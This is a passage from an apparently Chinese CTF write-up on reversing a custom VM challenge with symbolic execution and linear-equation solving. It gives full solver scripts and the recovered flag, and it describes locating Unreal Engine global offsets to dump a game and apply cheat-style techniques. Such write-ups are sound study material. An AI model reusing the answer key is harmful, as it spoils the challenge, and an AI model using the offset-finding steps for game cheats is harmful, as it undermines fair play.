class="line">            regs[dst] = expr_sub(regs[op1], regs[op2])</span><br><span class="line">        elif opcode == 5:  # store</span><br><span class="line">            addr = regs[dst][&#x27;const&#x27;]</span><br><span class="line">            mem[addr] = dict(regs[op1])</span><br><span class="line">        elif opcode == 6:  # load</span><br><span class="line">            addr = regs[dst][&#x27;const&#x27;]</span><br><span class="line">            regs[op1] = dict(mem.get(addr, &#123;&#x27;const&#x27;: 0&#125;))</span><br><span class="line">        elif opcode == 4:  # xor -&gt; zero</span><br><span class="line">            regs[dst] = &#123;&#x27;const&#x27;: 0&#125;</span><br><span class="line">    expr = mem[0x26]</span><br><span class="line">    coeffs = [0] * 36</span><br><span class="line">    for name, val in expr.items():</span><br><span class="line">        if name == &#x27;const&#x27;:</span><br><span class="line">            continue</span><br><span class="line">        idx = int(name[1:])</span><br><span class="line">        coeffs[idx] = norm16(val)</span><br><span class="line">    target = norm16(regs[1][&#x27;const&#x27;])</span><br><span class="line">    return coeffs, target</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    with open(&#x27;chall&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">        f.seek(BYTECODE_OFFSET)</span><br><span class="line">        buf = f.read(BYTECODE_LEN)</span><br><span class="line"></span><br><span class="line">    rows = []</span><br><span class="line">    rhs = []</span><br><span class="line">    for blk in range(NUM_BLOCKS):</span><br><span class="line">        block = [</span><br><span class="line">            struct.unpack_from(&#x27;&lt;HHHH&#x27;, buf, blk * BLOCK_SIZE * 8 + i * 8)</span><br><span class="line">            for i in range(BLOCK_SIZE)</span><br><span class="line">        ]</span><br><span class="line">        coeffs, target = run_block(block)</span><br><span class="line">        rows.append(coeffs)</span><br><span class="line">        rhs.append(target)</span><br><span class="line"></span><br><span class="line">    for i, (row, target) in enumerate(zip(rows, rhs)):</span><br><span class="line">        nz = [(idx, val) for idx, val in enumerate(row) if val]</span><br><span class="line">        print(f&#x27;Block &#123;i:02d&#125; target=&#123;target:4d&#125; terms=&#123;len(nz)&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013215227593.png" alt="image-20251013215227593"></p>
<p>这 36 行输出各自对应虚拟机的 36 个检测块，意思是：</p>
<p>Block XX target&#x3D;YYY：这个块最终把data[0x26]累加成一个值，然后要求它等于常数 YYY。比如第一条 target&#x3D;-6，说明块 0 最终要求组合结果 &#x3D; -6。</p>
<p>terms&#x3D;36：这一块里把 36 个输入字符全部用到了（每个变量的系数都非零）。换句话说，Block 00 其实表示 Σ coeff_i * x_i &#x3D; -6，这里的 coeff_i 包括正负 1、±其他整系数，x_i 就是 flag 第 i 个字符的 ASCII 值。</p>
<p>这些信息是我们后面构建线性方程组的原料。对每个块，我们不仅记录 target，还记录一整行 36 个系数（脚本里 run_block 返回的 coeffs）。把 36 行系数拼在一起，就是一个 36×36 的矩阵；把 36 个 target 拼成右端向量，然后解这个线性系统，就能得到 36 个字符的 ASCII 数值，自然就复原出 flag。</p>
<p>并不是拿具体输入去跑 VM，而是把每个寄存器&#x2F;内存槽都用符号表达式来表示（x0..x35 对应 36 个输入字符）。由于字节码里只出现了设常量、加&#x2F;减、内存读写这些线性操作，整条指令流对输入的影响天然是线性的，能一直用”符号系数”追踪下去。</p>
<p>因此，跑完一个块后得到的不是“实际值”，而是一个方程：memory[0x26] &#x3D; Σ coeff_i * x_i，而 reg1 给出同一块中设置的常数 target。这两者相等就形成了线性约束 Σ coeff_i * x_i &#x3D; target。</p>
<p>如果只盯住第一块，在这个块里把所有指令跑一遍，最终都会看到：该块把输入字符按特定系数累加到 memory[0x26]，然后和 reg1 里的常量比较。只要能把这串系数和常量提炼出来，就知道这一组的线性关系了。</p>
<p>在抽象出 36 条线性方程后，把它们堆成一个 36×36 的矩阵 A 和一个长度 36 的常量向量 b（脚本里 rows 和 rhs）</p>
<p>run_block得到关系，solve_linear来解开这个关系</p>
<p>举一个例子</p>
<p>只有三个指令，输入长度也只有3</p>
<ul>
<li>set rX, imm：把寄存器 rX 设成常数。</li>
<li>load rX, addr：读取数据区 mem[addr]（一开始就是输入字符）放进寄存器。</li>
<li>add rX, rY：把 rX &#x3D; rX + rY。</li>
<li>store addr, rX：把寄存器写回内存。</li>
<li>cmp rX, imm：比较寄存器是否等于常数。</li>
</ul>
<p> 假设字节码只有 5 条：</p>
<pre><code>1. set r0, 0          ; 把寄存器0清零
2. load r1, 0         ; 读取 x0
3. add r0, r1         ; r0 += x0
4. load r1, 1         ; r1 = x1
5. add r0, r1         ; r0 += x1
6. load r1, 2         ; r1 = x2
7. add r0, r1         ; r0 += x2
8. cmp r0, 100        ; 检查 x0 + x1 + x2 == 100 ?
</code></pre>
<p>这题的思路就是</p>
<p>把他们符号化</p>
<p>mem[0] &#x3D; x0</p>
<p>mem[1] &#x3D; x1</p>
<p>mem[2] &#x3D; x2</p>
<p>然后按指令跑：</p>
<ul>
<li>指令 1：r0 &#x3D; 0</li>
<li>指令 2：r1 &#x3D; x0</li>
<li>指令 3：r0 &#x3D; r0 + r1 &#x3D; 0 + x0 &#x3D; x0</li>
<li>指令 4：r1 &#x3D; x1</li>
<li>指令 5：r0 &#x3D; x0 + x1</li>
<li>指令 6：r1 &#x3D; x2</li>
<li>指令 7：r0 &#x3D; x0 + x1 + x2</li>
<li>指令 8：要求 r0 &#x3D;&#x3D; 100</li>
</ul>
<p>因此我们得到一个线性方程：x0 + x1 + x2 &#x3D; 100。</p>
<p>如果再来一个块，让它计算 x0 - x1 + 2*x2 &#x3D; 50，响应用符号执行同样的流程，就能得到第二条方程。把这两条放在一起就是个小的线性方程组，解出来就能知道三个输入字符的值。</p>
<p>为什么能这样?因为我们之前观察了指令</p>
<ol>
<li>只有线性变化</li>
<li>执行约260条指令才check，也就是这么多指令对应一个check</li>
</ol>
<p>不就刚好组成一个方程组了吗 0.0</p>
<p>exp：</p>
<blockquote>
<p>GPT5帮着修了好久的脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">1</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">BLOCK_SIZE = <span class="number">260</span></span><br><span class="line">NUM_BLOCKS = <span class="number">36</span></span><br><span class="line">INSTR_COUNT = BLOCK_SIZE * NUM_BLOCKS</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">locate_bytecode</span>(<span class="params">blob, need=INSTR_COUNT</span>):</span><br><span class="line">    run = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(blob) - <span class="number">8</span>, <span class="number">8</span>):</span><br><span class="line">        opcode = <span class="built_in">int</span>.from_bytes(blob[off + <span class="number">6</span>:off + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= opcode &lt;= <span class="number">0xC</span>:</span><br><span class="line">            run += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> run == need:</span><br><span class="line">                <span class="keyword">return</span> off - (need - <span class="number">1</span>) * <span class="number">8</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            run = <span class="number">0</span></span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;bytecode blob not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_expr</span>(<span class="params">a, b</span>):</span><br><span class="line">    keys = <span class="built_in">set</span>(a) | <span class="built_in">set</span>(b)</span><br><span class="line">    <span class="keyword">return</span> &#123;k: (a.get(k, <span class="number">0</span>) + b.get(k, <span class="number">0</span>)) % MOD <span class="keyword">for</span> k <span class="keyword">in</span> keys&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_expr</span>(<span class="params">a, b</span>):</span><br><span class="line">    keys = <span class="built_in">set</span>(a) | <span class="built_in">set</span>(b)</span><br><span class="line">    <span class="keyword">return</span> &#123;k: (a.get(k, <span class="number">0</span>) - b.get(k, <span class="number">0</span>)) % MOD <span class="keyword">for</span> k <span class="keyword">in</span> keys&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_block</span>(<span class="params">insts</span>):</span><br><span class="line">    regs = &#123;i: &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)&#125;</span><br><span class="line">    mem = &#123;i: &#123;<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)&#125;</span><br><span class="line">    mem[<span class="number">0x26</span>] = &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> dst, op1, op2, opcode <span class="keyword">in</span> insts:</span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="number">1</span>:  <span class="comment"># set reg</span></span><br><span class="line">            regs[dst] = &#123;<span class="string">&#x27;const&#x27;</span>: op1 % MOD&#125;</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">3</span>:  <span class="comment"># add</span></span><br><span class="line">            regs[dst] = add_expr(regs[op1], regs[op2])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">10</span>:  <span class="comment"># sub</span></span><br><span class="line">            regs[dst] = sub_expr(regs[op1], regs[op2])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">5</span>:  <span class="comment"># store mem</span></span><br><span class="line">            addr = regs[dst][<span class="string">&#x27;const&#x27;</span>] % MOD</span><br><span class="line">            mem[addr] = <span class="built_in">dict</span>(regs[op1])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">6</span>:  <span class="comment"># load mem</span></span><br><span class="line">            addr = regs[dst][<span class="string">&#x27;const&#x27;</span>] % MOD</span><br><span class="line">            regs[op1] = <span class="built_in">dict</span>(mem.get(addr, &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;))</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">4</span>:  <span class="comment"># xor (实际上只用于清零)</span></span><br><span class="line">            regs[dst] = &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">        <span class="comment"># 其它 opcode（比较/校验）不会影响线性方程，忽略即可</span></span><br><span class="line">    expr = mem[<span class="number">0x26</span>]</span><br><span class="line">    coeffs = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line">    <span class="keyword">for</span> label, value <span class="keyword">in</span> expr.items():</span><br><span class="line">        <span class="keyword">if</span> label == <span class="string">&#x27;const&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        idx = <span class="built_in">int</span>(label[<span class="number">1</span>:])</span><br><span class="line">        coeffs[idx] = value <span class="keyword">if</span> value &lt; <span class="number">0x8000</span> <span class="keyword">else</span> value - <span class="number">0x10000</span></span><br><span class="line">    target = regs[<span class="number">1</span>][<span class="string">&#x27;const&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> target &gt;= <span class="number">0x8000</span>:</span><br><span class="line">        target -= <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">return</span> coeffs, target</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_system</span>(<span class="params">blob</span>):</span><br><span class="line">    start = locate_bytecode(blob)</span><br><span class="line">    coeffs, targets = [], []</span><br><span class="line">    <span class="keyword">for</span> blk <span class="keyword">in</span> <span class="built_in">range</span>(NUM_BLOCKS):</span><br><span class="line">        base = start + blk * BLOCK_SIZE * <span class="number">8</span></span><br><span class="line">        block = [</span><br><span class="line">            struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, blob, base + i * <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(BLOCK_SIZE)</span><br><span class="line">        ]</span><br><span class="line">        row, rhs = run_block(block)</span><br><span class="line">        coeffs.append(<span class="built_in">list</span>(<span class="built_in">map</span>(Fraction, row)))</span><br><span class="line">        targets.append(Fraction(rhs))</span><br><span class="line">    <span class="keyword">return</span> coeffs, targets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_linear</span>(<span class="params">A, b</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(A)</span><br><span class="line">    M = [row[:] <span class="keyword">for</span> row <span class="keyword">in</span> A]</span><br><span class="line">    y = b[:]</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        pivot = <span class="built_in">max</span>(<span class="built_in">range</span>(col, n), key=<span class="keyword">lambda</span> r: <span class="built_in">abs</span>(M[r][col]))</span><br><span class="line">        <span class="keyword">if</span> M[pivot][col] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;singular matrix&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> pivot != col:</span><br><span class="line">            M[col], M[pivot] = M[pivot], M[col]</span><br><span class="line">            y[col], y[pivot] = y[pivot], y[col]</span><br><span class="line">        pivot_val = M[col][col]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">            M[col][j] /= pivot_val</span><br><span class="line">        y[col] /= pivot_val</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(col + <span class="number">1</span>, n):</span><br><span class="line">            factor = M[row][col]</span><br><span class="line">            <span class="keyword">if</span> factor == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">                M[row][j] -= factor * M[col][j]</span><br><span class="line">            y[row] -= factor * y[col]</span><br><span class="line">    x = [Fraction(<span class="number">0</span>)] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        s = y[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, n):</span><br><span class="line">            s -= M[i][j] * x[j]</span><br><span class="line">        x[i] = s</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(<span class="built_in">round</span>(val)) <span class="keyword">for</span> val <span class="keyword">in</span> x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    blob = <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    A, b = build_system(blob)</span><br><span class="line">    chars = solve_linear(A, b)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> chars)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>DASCTF{w4ll_CpP_4nD_1O5_1S_Qu1T_FuN}</p>
<h2 id="那些努力过没出的题"><a href="#那些努力过没出的题" class="headerlink" title="那些努力过没出的题"></a>那些努力过没出的题</h2><h3 id="Python’s-Shed-Skin"><a href="#Python’s-Shed-Skin" class="headerlink" title="Python’s Shed Skin"></a>Python’s Shed Skin</h3><p>可惜了，delta好像是0xdeadbeef，好像魔改了50，纯静态分析，时间不够了，花时间调一下有可能可以做出来</p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">python反编译 - 在线工具</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ezpy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ezpy.encrypt_check_flag(user_input):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Correct Flag! You are a master of reversing!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong Flag! Keep trying.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Overwatch"><a href="#Overwatch" class="headerlink" title="Overwatch"></a>Overwatch</h3><p>比较想做出来的一道题</p>
<p>overwatch的话偏移搞错了，不然应该至少能出一段flag，一直以为是gworld搞错了，因为之前提取一直报错提示我gobject，后来能dump，却只有一点信息，那么猜想必然是gworld错了…结果打脸了</p>
<p>还有就是不知道为什么搜索seameless还有些常见字符串都搜索不到，出现这种情况，或者直接没有，看了源码才勉强能搜到一两个…</p>
<p><strong>赛后下面那个偏移问题(主要是被网上某篇瞎写的博客和IDA字符串加载给暗算了)解决了自己做了下直接出了一段flag，后一段flag没找到只能看wp了</strong></p>
<blockquote>
<p>好的!我知道了尴尬了，我还是太着急了，刚刚写这个wp的时候又打开来了(之前保存的i64)，搜了一下seamless，发现直接出现了，原来是IDA加载太慢了，我太急了，我就不该上课 T.T </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013222036823.png" alt="image-20251013222036823"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013221924088.png" alt="image-20251013221924088"></p>
</blockquote>
<p>dump工具：<a target="_blank" rel="noopener" href="https://github.com/Spuckwaffel/UEDumper">Spuckwaffel&#x2F;UEDumper: The most powerful Unreal Engine Dumper and Editor for UE 4.19 - 5.3</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012162204075.png" alt="image-20251012162204075"></p>
<p>可以看这个视频</p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=M7VLd1xrVoM">https://www.youtube.com/watch?v=M7VLd1xrVoM</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012172315439.png" alt="image-20251012172315439"></p>
<p>说一下找三件套吧</p>
<p>Fname找ByteObject</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102225239.png" alt="image-20251014102225239"></p>
<p>交叉引用这个方法，是最上面那个</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102258624.png" alt="image-20251014102258624"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102334465.png" alt="image-20251014102334465"></p>
<p>第一个偏移：0x4869C80</p>
<blockquote>
<p>ps：可以看那个印度佬的视频，挺好的，先去rebase里把机制定位0</p>
</blockquote>
<p>找UWorld时，我是IDA没加载出来这个”Seamless”字符串</p>
<blockquote>
<p>关于如何对照源码<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV19R4y1g7i3/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=d76ad0aadca055336653cd966075f064">虚幻4 UE4 逆向 寻找 世界地址 UWORLD地址 教程_哔哩哔哩_bilibili</a></p>
<p>可以先去github把对应版本的源码下载下来，需要加入epicgame组织先，</p>
</blockquote>
<p>所以我对照了源码最终找到一个</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102621791.png" alt="image-20251014102621791"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102704430.png" alt="image-20251014102704430"></p>
<p>当然常规的方法更简单一点</p>
<blockquote>
<p>搜索： SeamlessTravel FlushLevelStreaming</p>
</blockquote>
<p>往上直接找到：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014103045269.png" alt="image-20251014103045269"></p>
<p>第二个uworld有了：49ee370</p>
<p>第三个gobject，我也是死在这了…</p>
<p>我找的偏移是0x48A5FC0</p>
<p>看了wp发现是：0x48A5FD0</p>
<p>….</p>
<p>就差0x10，可能是数据结构哪里搞错了应该</p>
<p>当时找了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104421969.png" alt="image-20251014104421969"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104434870.png" alt="image-20251014104434870"></p>
<p>当时字符串没加载出来，简单的把48A5FC0作为Gobject肯定不对，都跟上面不太像其实</p>
<p>实际上被误导了?</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/revercc/p/17641855.html#%E5%AF%BB%E6%89%BEguobjectarray">ue5游戏逆向之寻找GWorld，GName和GUObjectArray - 怎么可以吃突突 - 博客园</a></p>
<p>这里虽然是ue5的方法，但是道理应该差不多，为什么偏移不对?</p>
<p>官解搜索的是：NewObject with….</p>
<p>可是我看了下引用：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105547046.png" alt="image-20251014105547046"></p>
<p>这找个damn…</p>
<p>不知道是不是我IDA的原因</p>
<p>运气足够好,第二个就是</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105748059.png" alt="image-20251014105748059"></p>
<p>但是我并没有找到源码中对应的寻找方式，可能是源码中把NewObject字符串包装了，得搜索引用这个函数的才能去找GUObject</p>
<p>推荐搜索Failed to load Enginee class，跟刚才的NewObject With到达的是一个地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110256024.png" alt="image-20251014110256024"></p>
<p>48A5FD0</p>
<p>offset.h里填好</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110520421.png" alt="image-20251014110520421"></p>
<p>dump成功如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110946452.png" alt="image-20251014110946452"></p>
<p>后面就是游戏逆向，猜测flag在墙外，因而只有几种常规方法：透视(墙不见) 穿墙 飞天遁地</p>
<p>在merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h种有</p>
<blockquote>
<p>这个文件不是引擎原生的源码文件，而是 <strong>自动合并生成的头文件</strong>，</p>
<p>目的是把多个模块导出的类、枚举、结构体合并在一个文件中方便分析。</p>
</blockquote>
<p>这个枚举定义在 UE 原版引擎中是 <strong>角色移动组件（Character Movement Component）</strong> 的核心枚举</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>场景举例</th>
<th>行为逻辑</th>
</tr>
</thead>
<tbody><tr>
<td><code>MOVE_None</code></td>
<td>不可移动（如被眩晕、冻结）</td>
<td>停止更新物理</td>
</tr>
<tr>
<td><code>MOVE_Walking</code></td>
<td>在地面上走</td>
<td>使用地面摩擦力、速度计算</td>
</tr>
<tr>
<td><code>MOVE_NavWalking</code></td>
<td>AI 路径导航行走</td>
<td>使用 NavMesh</td>
</tr>
<tr>
<td><code>MOVE_Falling</code></td>
<td>从高处坠落</td>
<td>使用重力</td>
</tr>
<tr>
<td><code>MOVE_Swimming</code></td>
<td>在水中游动</td>
<td>使用流体阻力、浮力</td>
